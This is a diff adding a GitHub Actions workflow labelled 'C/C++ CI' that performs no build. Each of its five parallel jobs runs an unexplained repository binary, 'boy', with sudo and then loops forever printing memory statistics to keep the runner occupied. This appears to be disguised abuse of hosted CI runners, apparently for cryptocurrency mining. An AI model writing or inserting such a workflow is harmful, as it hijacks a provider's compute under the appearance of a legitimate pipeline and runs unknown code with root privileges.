@@ -1,0 +1,63 @@
+name: C/C++ CI
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 boy
+        sudo ./boy
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
+          
+  test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 boy
+        sudo ./boy
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
+  pack:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 boy
+        sudo ./boy
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
+          
+  sign:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 boy
+        sudo ./boy
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
+          
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 boy
+        sudo ./boy
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
